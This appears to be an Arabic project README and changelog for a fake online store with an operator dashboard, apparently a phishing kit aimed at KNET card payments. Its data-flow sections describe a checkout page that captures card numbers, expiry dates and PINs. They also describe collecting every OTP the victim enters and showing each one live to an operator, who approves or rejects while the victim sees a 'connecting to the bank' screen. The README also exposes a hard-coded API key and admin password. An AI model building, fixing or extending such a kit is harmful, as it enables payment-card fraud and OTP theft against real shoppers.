# لوحة الإشعارات المتقدمة + موقع العملاء — مشروع مدمج

## النطاق

مشروع موحّد يجمع موقع العملاء (HTML ثابت) ولوحة التحكم (HTML/JS جديدة) في استضافة واحدة.
كلاهما متصل بنفس مشروع Firebase `qatar-oman` ويتشاركان البيانات عبر collection `customers`.

## التشغيل

```bash
python3 serve.py
```
- موقع العملاء: http://localhost:12001/
- لوحة التحكم:  http://localhost:12001/admin/

المنفذ الافتراضي 12001. الخادم يخدم:
- `/` وملفات HTML الثابتة → موقع العملاء
- `/admin/*` → لوحة التحكم (مع SPA fallback)

## البنية

```
.
├── index.html              # موقع العملاء (المتجر)
├── cartepage.html          # السلة
├── knet.html               # صفحة الدفع/البطاقة
├── verification.html       # صفحة التحقق OTP
├── creatprogect.html       # لوحة تحكم المنتجات
├── assets/                 # CSS/JS/صور موقع العملاء
│   └── js/
│       ├── firebase-client.js   # عميل Firebase للموقع (يكتب customers)
│       ├── products-store.js    # مزامنة المنتجات مع Firestore
│       └── admin-panel.js       # (قديم، لم يُعد يُستخدم)
├── admin/                  # لوحة التحكم الجديدة
│   ├── index.html          # واجهة لوحة التحكم
│   ├── favicon.svg
│   ├── logo-*.png          # شعارات البنوك
│   └── assets/
│       ├── panel.css       # نفس CSS الأصلي (Tailwind مُجمّع، 138KB)
│       └── js/
│           ├── firebase-config.js   # إعدادات Firebase + حساب المدير
│           └── app.js               # منطق لوحة التحكم
└── serve.py                # خادم HTTP موحّد
```

## Firebase

مشروع واحد موحّد `qatar-oman` لكل من الموقع ولوحة التحكم:
- apiKey: AIzaSyDNQotHYC8WcMi1AAHrHJe_rQR7OZ0V5FI
- الإعدادات في `assets/js/firebase-client.js` (الموقع) و `admin/assets/js/firebase-config.js` (اللوحة)

حساب المدير (مُضمّن في كلا الملفين):
- email: panel-dashboard@qatar-oman.local
- password: ZainDashboard2026!

## تدفق البيانات (Data Flow)

العميل (kuwait-shop) ↔️ Firestore `customers/{sessionId}` ↔️ لوحة التحكم (admin/)

| الحدث | الموقع يكتب | اللوحة تقرأ |
|-------|-------------|--------------|
| دخول العميل | `customers/{id}` {sessionId, status, lastSeen, currentPage} | يظهر في الجدول |
| إكمال السلة | `customers/{id}` {name, phone, address, amount} | يظهر في تفاصيل العميل |
| إدخال بطاقة | `cards/{id}`, `card_data/{sessionId}/attempts` | يظهر زر "معلومات البطاقة" |
| إدخال OTP | `customers/{id}.otp`, `otps/{id}` | يظهر الرمز في عمود "الكود" |
| الموافقة/الرفض | اللوحة تكتب `customers/{id}.decision` | الموقع يستمع ويتجاوب |

## لوحة التحكم (admin/) — ميزات

- شاشة تسجيل دخول + جلسة محفوظة (localStorage)
- 4 بطاقات إحصائيات (زوار، متصلون، بطاقات، موافقات)
- فلاتر: تبويبات (الكل/معلق/بطاقات/متصل) + ترتيب (تاريخ/حالة/دولة) + بحث
- جدول إشعارات بـ 8 أعمدة + ترقيم صفحات
- نافذة منبثقة: معلومات شخصية + معلومات البطاقة (كل بيانات في صندوقها)
- أزرار موافقة/رفض (تكتب `decision` في Firestore عبر sessionId)
- نوافذ: الإعدادات + تصدير JSON/CSV
- توست (toasts) للإشعارات
- اختصارات: Ctrl+R للتحديث، Esc لإغلاق النوافذ
- تحديث لحظي عبر `onSnapshot`

## مصدر البيانات (عرض كل الإدخالات — الخيار A)

تدمج ثلاث مجموعات من Firestore:
1. **`cards`** — كل بطاقة كوثيقة منفصلة (cardNumber, cardPrefix, bankName, expiry, pin, sessionId, createdAt)
2. **`customers`** — بيانات العميل (name, phone, address, amount, otp, status, decision, lastSeen, currentPage)
3. **`otps`** — كل رمز OTP كوثيقة منفصلة (otp, sessionId, createdAt, timestamp)

الدمج عبر `sessionId`: كل بطاقة تظهر كصف منفصل في الجدول. كل إشعار يحمل:
- `allCards`: كل بطاقات العميل (للعرض في صناديق متعددة)
- `allOtps`: كل رموز OTP للعميل (للعرض في صناديق متعددة)

### السلوك عند إدخال العميل لبيانات عدة مرات:
- **البطاقات**: كل بطاقة تُحفظ في `cards/` كوثيقة جديدة وتظهر كصف منفصل. في نافذة التفاصيل، كل بطاقة في صندوق خاص (البطاقة 1 الأحدث، البطاقة 2 سابقة...).
- **OTP**: كل رمز يُحفظ في `otps/` كوثيقة جديدة. في نافذة المعلومات الشخصية، كل OTP في صندوق خاص (#1، #2...) مع زر نسخ. عمود "الكود" في الجدول يعرض أحدث OTP.
- **بيانات العميل**: آخر قيم (تُحدّث بـ merge في `customers/{sessionId}`).

## صفحات المنتجات الديناميكية (SEO)

- `product_page.py` (جذر المشروع): يجلب المنتجات من Firestore `products` عبر REST API
  (بدون مصادقة أولاً، ثم بحساب اللوحة عند 401/403/429) ويولّد HTML كامل (SSR).
- المسارات في `serve.py`:
  - `/product/<id>/<slug>` — صفحة منتج كاملة (title/meta/OG + Product/Breadcrumb/FAQ Schema)
  - `/product-img/<id>` — يقدّم صور المنتجات المخزنة كـ data URI كملفات حقيقية
  - `/prices` — صفحة "أسعار اليوم" الديناميكية (تاريخ اليوم تلقائياً + ItemList Schema)
  - `/feed.xml` — ملف منتجات Google Merchant Center (RSS 2.0 + g: namespace)
  - `/sitemap.xml` — ديناميكي من المنتجات الحالية (الملف الثابت احتياط فقط)
- سياسة المحتوى: كلمات "أرخص/عروض" في meta/title فقط (نتيجة البحث)، وجسم الصفحة نظيف.
- صفحات قانونية ثابتة: `terms.html` و `privacy.html` (مضافة للقائمة والخريطة).
- القائمة الجانبية في index.html: زر `#menuBtn` يفتح `#menuDrawer` —
  روابط الصفحات ثابتة + المنتجات تُعبّأ ديناميكياً عبر `renderMenuProducts()`.
- التخزين المؤقت: ذاكرة 5 دقائق + `.products-cache.json` على القرص (احتياط عند فشل Firestore).
- المنتجات في `index.html` ترتبط بصفحاتها عبر `productPageUrl()` (تحتاج `_id` من Firestore).
- ملاحظة: بيئة التطوير هذه قد يُحجب عنها firestore.googleapis.com (429 مشترك) —
  البيانات الحقيقية للمعاينة تُؤخذ من localStorage للموقع المباشر.

## إصلاح حلقة توجيه العميل (RTDB commands/redirect)

**المشكلة:** إشارة التوجيه (وأوامر الموافقة/الرفض) تُكتب في `commands/{sessionId}/redirect`
دون حذفها أبداً. بعد تنفيذ التوجيه وانتقال العميل للصفحة الجديدة، تقرأ الصفحة الجديدة
نفس الإشارة المتبقية في قاعدة البيانات فتوجّه من جديد → حلقة إعادة تحميل لا نهائية.
(الحماية القديمة `window.__redirectHandled` تعيش في الذاكرة فقط وتُصفَّر مع كل إعادة تحميل).

**الحل (`assets/js/firebase-client.js`، قسم RTDB):**
- `clearCmd(kind)` يحذف عقدة الأمر من قاعدة البيانات فور تنفيذه (`remove()`).
- بصمة دائمة في `localStorage` (`zain_cmd_<kind>_<sessionId>`) تبقى بعد إعادة التحميل،
  فلا يُنفَّذ نفس الأمر مرتين حتى لو تأخّر الحذف.
- تجاهل التوجيه إذا كانت الصفحة الهدف هي الصفحة الحالية (حماية من التوجيه الذاتي).
- طُبِّق نفس المنطق على `approval` و`rejection` لمنع تكرارهما بعد الانتقال.
- **مهم:** رُفع `?v=` لـ `firebase-client.js` من `3` إلى `4` في كل الصفحات.

## النشر على Netlify — صفحات المنتجات الثابتة (إصلاح كسر صفحة المنتج)

**المشكلة:** عند النقر على صورة منتج كان الرابط `/product/<id>/<slug>` يفتح الصفحة الرئيسية
بدون سكربتات (منتجات بلا سلة/طلب). السبب:
- `serve.py` يولّد صفحة المنتج **ديناميكياً عند الطلب** (SSR)، وهذا لا يعمل على Netlify
  (استضافة ملفات ثابتة فقط) → لا يوجد ملف في هذا المسار.
- قاعدة `/*  /index.html  200` في `_redirects` كانت تُخدِم `index.html` بدلاً منه.
- وبما أن `index.html` كان يُخدَم من مسار **عميق**، كانت كل مساراته النسبية
  (`./assets/...`) تُحلّ خطأً إلى `/product/<id>/<slug>/assets/...` الذي لا يوجد، فتُعيد
  نفس القاعدة `index.html` (HTML) مكان ملفات JS/CSS → تفشل كل السكربتات.

**الحل:**
- `build_static.py` (جديد): يولّد الملفات فعلياً من `products-snapshot.json` (بدون شبكة):
  `product/<id>/<slug>.html` (نسختان: اسم مشفّر ومفكوك)، `prices.html`، `feed.xml`، `sitemap.xml`.
- `_redirects`: قاعدتان قبل الـ catch-all:
  `/product/:id/:slug  →  /product/:id/:slug.html  200` و `/prices → /prices.html  200`.
- `netlify.toml`: أمر بناء `python3 build_static.py || true` (يعمل عند كل نشر، ولا يُفشل النشر).
- كل مسارات الأصول صارت **مطلقة** (`/assets/...`) في `index.html` و`cartepage.html` و`knet.html`
  و`verification.html` و`creatprogect.html`، ودالة `absImg()` في `index.html` تجعل صور المنتجات
  مطلقة أيضاً — حماية إضافية لأي رابط عميق.
- `sync_products.py` يستدعي `build_static.build()` تلقائياً بعد المزامنة.

**مهم:** عند تعديل المنتجات شغّل `python3 sync_products.py` (يحدّث الملفات الثابتة تلقائياً)،
أو `python3 build_static.py` مباشرة. الملفات المولّدة تُلتزَم في المستودع ليعمل النشر فوراً.

## ملاحظات

- لوحة التحكم الجديدة بُنيت من HTML/JS واضح (قابل للتعديل الكامل)
- استخدمت نفس CSS الأصلي (panel.css) للحفاظ على نفس المظهر
- لا يوجد React/Vite — HTML ثابت فقط، يحلّ أزمة التعديل

## إصلاح حلقة إعادة التحميل (قرار الموافقة/الرفض)

**المشكلة:** عند وصول موافقة/رفض من اللوحة كان الموقع يعيد التحميل ويرسل الرسالة بشكل متكرر
(حلقة) لعدة أسباب متراكبة:
1. `verification.html` كان يستدعي `location.reload()` عند الرفض، وبعد إعادة التحميل يقرأ نفس
   القرار المحفوظ في Firestore فيعيد الرسالة من جديد → حلقة لا نهائية.
2. `listenForAdminCommands` كان يعتبر "نفس القرار" مكرراً فقط إذا تطابق الطابع الزمني،
   وكان الطابع الزمني يتغيّر (بسبب نبض `lastSeen` كل 10 ثوانٍ) فيُعاد التنفيذ.
3. مساران (onSnapshot + استطلاع REST كل ثانيتين) + قناة RTDB كانوا يستدعون نفس القرار عدة مرات.
4. `commands/{sessionId}/redirect` كان ينتقل عند كل حدث value.

**الحل (`assets/js/firebase-client.js`):**
- نقطة تنفيذ واحدة `dispatchDecision()` لكل القرارات (Firestore + RTDB)، مع منع التكرار خلال
  نافذة 4 ثوانٍ وعلامة `__decisionInFlight` خلال التنفيذ.
- بعد تنفيذ أي قرار: تصفير الحقل في قاعدة البيانات إلى `pending` (`resetDecisionToPending`)
  فيتمكن المدير من الكتابة/الإرسال من جديد فوراً.
- عند رؤية `pending` لمدة ثانيتين يُصفَّر القرار محلياً ليُقبل قرار جديد بنفس القيمة.
- `redirect` صار يُنفَّذ مرة واحدة فقط.

**الحل (الصفحات):**
- `verification.html`: حذف `location.reload()` تماماً — رسالة النجاح/الرفض تُعرض داخل الصفحة
  عبر `v220()`، ومؤقت الـ4 ثوانٍ لا يستبدل قراراً حقيقياً وصل (`window.__otpDecisionSeen`).
- `knet.html`: عند الرفض تُفرَّغ الحقول ويُعاد تمكينها (`i15`,`i12`,`i12cvv`,`i19`,`i21`,`v116`)
  وتُظهر رسالة الرفض؛ عند الموافقة تُزال شاشة "جار الاتصال بالبنك" ثم يُمرَّر للتحقق.

**مهم:** عند تعديل `firebase-client.js` يجب رفع رقم `?v=` في وسوم `<script>` داخل الصفحات
(`index.html`, `cartepage.html`, `knet.html`, `verification.html`, `creatprogect.html`, ...)
لأن الملف يُخزَّن سنة كاملة عند العميل.

## العرض الفوري للمنتجات + المزامنة (تحديث)

**المشكلة:** كانت المنتجات تتأخر ثوانٍ عند فتح الموقع لأن العرض كان ينتظر سلسلة
المصادقة (`ensureAuthReady`) ثم `storeGetProducts()`/`onSnapshot` من Firestore،
إضافة إلى 4 سكربتات Firebase مانعة للتحليل في `<head>` (~160KB) تؤخر `DOMContentLoaded`.

**الحل:** عرض المنتجات أولاً من ملفات المشروع المحلية، ثم مزامنتها من قاعدة البيانات
(المزامنة باقية ولم تُلغَ).

### الملفات المولّدة (لا تُعدَّل يدوياً)
- `assets/js/products-local.js` → `window.LOCAL_PRODUCTS` (حقول: `_id`, `name`, `desc`, `price`, `img`).
- `assets/images/products/<hash>.<ext>` → صور المنتجات كملفات حقيقية (كانت data URI).
- `products-snapshot.json` → احتياطي الخادم لصفحات SEO (SSR).

### أداة المزامنة
```bash
python3 sync_products.py                 # Firestore، ويرجع للقطة عند الفشل
python3 sync_products.py --source snapshot
python3 sync_products.py --dry-run
```
تجلب المنتجات، تفكّ صور data URI إلى ملفات (مع إزالة التكرار بـ sha1 وحذف الصور
القديمة غير المستخدمة)، تكتب `products-local.js` و`products-snapshot.json`،
وترفع رقم `?v=` لـ `products-local.js` في `index.html` تلقائياً.

### التدفق في index.html
1. `products-local.js` و`cart.js` سكربتان متزامنان صغيران (جاهزان أثناء تحليل الصفحة).
2. سكربتات Firebase + `firebase-client.js` + `products-store.js` بـ `defer` (لا توقف الرسم).
3. عند التحليل: `renderProducts(getLocalProducts())` فوراً — بدون انتظار الشبكة.
4. عند `DOMContentLoaded`: `restoreQuantitiesFromCart()` ثم `syncProductsFromDatabase()`
   (تحدّث العرض بأحدث بيانات من قاعدة البيانات).

**ملاحظة:** `serve.py` يدعم الآن `image/avif` (كانت صور المنتجات المضمّنة avif).
**مهم:** عند تعديل `products-local.js` يدوياً (أو تغيير محتواه) يجب تحديث `?v=` في `index.html`؛
`sync_products.py` يفعل ذلك تلقائياً.

## إصلاح اختفاء المنتجات بعد إعادة الترتيب من اللوحة (دمج المصادر)

**المشكلة:** بعد تغيير المنتجات وإعادة ترتيبها من اللوحة، كانت بعض المنتجات تظهر
أولاً ثم تختفي وتُعرض منتجات أخرى. السبب الجذري:
- اللوحة/`creatprogect.html` تحفظ القائمة كاملة عبر `storeSaveProducts` مع
  `order` متسلسل من 0. أي خلل/تزامن (حفظ قائمة ناقصة مثل القائمة الافتراضية
  الـ15 عند فقدان مصدرها) **يحذف وثائق المنتجات الناقصة من مجموعة `products`**
  ويستبدلها. حدث فعلاً: قاعدة البيانات صارت 15 منتجاً بمعرّفات جديدة بينما
  اللقطة المحلية فيها 26 منتجاً بمعرّفات أصلية.
- الواجهة كانت تستبدل القائمة المعروضة بقائمة قاعدة البيانات فوراً
  (`renderProducts(remote)` / `onSnapshot`)، فما إن تصل قاعدة البيانات الناقصة
  حتى تُخفى المنتجات المحلية → "تظهر ثم تختفي".

**الحل (دمج المصادر + حماية الحذف):**
- `assets/js/products-store.js`: دالة `mergeProducts(remote, local)` تدمج بلا
  تكرار (البصمة = الاسم+السعر+الوصف). قاعدة البيانات لها الأولوية، وتُلحق أي
  منتج محلي مفقود (استرجاع). طُبّقت في `storeGetProducts` و`storeWatchProducts`.
  `mergeRef()` تختار المرجع: نسخة المتصفح إن كانت تحمل `_id` (تعكس حذف المدير
  فيبقى الحذف)، وإلا ملف `products-local.js`.
- حماية في `storeSaveProducts`: لا يُنفَّذ حذف الوثائق إن كانت القائمة بلا أي
  `_id` (منع مسح قاعدة البيانات بقائمة افتراضية).
- `index.html` → `initializeDefaultProducts()`: تُخزَّن نسخة محلية = اتحاد بلا
  تكرار بين المخزّن و`LOCAL_PRODUCTS` (لا استبدال يُفقد منتجات).
- `product_page.py` → `_fetch_products()`: `_merge_missing(products, _read_snapshot())`
  يُلحق منتجات اللقطة `products-snapshot.json` المفقودة من قاعدة البيانات (لصفحات
  SEO الثابتة). اللقطة تُحدَّث بـ `sync_products.py` بعد أي حذف شرعي فلا تُحيي محذوفاً.

**مهم:** بعد أي تعديل للمنتجات من اللوحة شغّل `python3 sync_products.py` لتحديث
`products-local.js` و`products-snapshot.json` (فيتحدّث مرجع الاسترجاع تلقائياً).
عند تعديل `products-store.js` ارفع `?v=` في `index.html` و`admin/index.html`
و`creatprogect.html` (رُفع إلى `4`).

## إصلاح صفحات المنتج على Netlify (روابط ASCII) + ثبات الترتيب + منع الوميض

**المشكلة 1 — صفحة تفاصيل المنتج لا تعمل على Netlify:**
كانت روابط المنتجات عربية مُرمَّزة (`/product/<id>/%D8%AA%D9%88%D8%AA...`).
Netlify فيه خلل معروف في إعادة التوجيه للروابط غير ASCII/المشفّرة percent-encoding،
فلا تُطابِق قاعدة `_redirects` (`/product/:id/:slug → ...html`) وتُرجع `index.html`
(صفحة رئيسية بلا سكربتات) بدل صفحة المنتج.

**الحل:** روابط المنتجات صارت **ASCII فقط** (ترجمة صوتية للعربية) بلا ترميز percent:
- `product_page.slugify()`: خريطة `_TRANSLIT` (عربي → لاتيني) + تنقية ASCII، و
  `product_url()` بلا `urllib.parse.quote`.
- `index.html`: `slugifyName()` + `AR_TRANSLIT` تطابق `slugify()` بايثون **حرفاً بحرف**
  (مُتحقَّق منه: 28/28 بلا اختلاف) و`productPageUrl()` بلا `encodeURIComponent`.
- `build_static.py`: يحذف مجلد `product/` بالكامل قبل التوليد (يزيل الصفحات العربية
  القديمة) ويكتب ملفاً واحداً لكل منتج `<slug>.html` بلا نسخة مفكوكة.
- مثال: `/product/pvPnj5vZw8zujIWVvBZo/twt-mlky-tazj`.

**المشكلة 2 — التوت يظهر في الأسفل و/أو يختفي:**
حذف وثيقة المنتج من Firestore (خطأ تزامن عند إعادة الترتيب من اللوحة) كان يُخفي
المنتج، وكان الدمج القديم يُلحق المنتج المسترجَع **في الأسفل** فتغيّر ترتيبه.

**الحل:**
- `mergeProducts` (JS) و`_merge_missing` (بايثون) صارا **يحافظان على الموضع**:
  قاعدة البيانات لها الأولوية، وأي منتج محلي مفقود يُدرَج في **موضعه الأصلي** من
  المصدر المحلي (لا في الأسفل). مُتحقَّق: التوت يعود للمرتبة 0.
- `product_page._fetch_products()`: ترتيب قاعدة البيانات أولاً، ثم الدمج، ثم
  ترقيم متسلسل `order=0..n` (يثبّت الترتيب المدمج ويصلح القيم `None`).
- `index.html renderProducts()`: بصمة `productsSignature()` تمنع إعادة رسم الشبكة
  عند وصول نفس القائمة من المزامنة/`onSnapshot` → **بلا وميض** بعد العرض المحلي.

**مهم:** المرجع المحلي (`products-local.js`/`products-snapshot.json`) يُحدَّث بـ
`sync_products.py` بعد أي حذف/إضافة شرعية، فلا يُحيي منتجاً حذفه المدير عمداً.
رُفع `products-store.js` إلى `v=6`.

## إصلاح زر «إتمام الطلب» في صفحة المنتج (إضافة المنتج للسلة)

**المشكلة:** زر «إتمام الطلب» في صفحة تفاصيل المنتج كان رابطاً ثابتاً
`<a href="/cartepage.html">` لا يضيف المنتج للسلة، فينتقل العميل إلى سلة فارغة.

**الحل (`product_page.py`، قالب صفحة المنتج):**
- الزر صار `<a ... onclick="buyNow(event)">` والرابط الافتراضي باقٍ للتنقّل.
- دالة `buyNow()` تستدعي `window.CartAdd(PRODUCT, 1)` (نفس دالة «إضافة للسلة»)
  ثم يُترك التنقّل الافتراضي إلى `/cartepage.html` — فيجد العميل المنتج في السلة.
- بعد أي تعديل شغّل `python3 build_static.py` لتحديث صفحات `product/*.html` الثابتة
  (المولّدة تُلتزَم في المستودع).
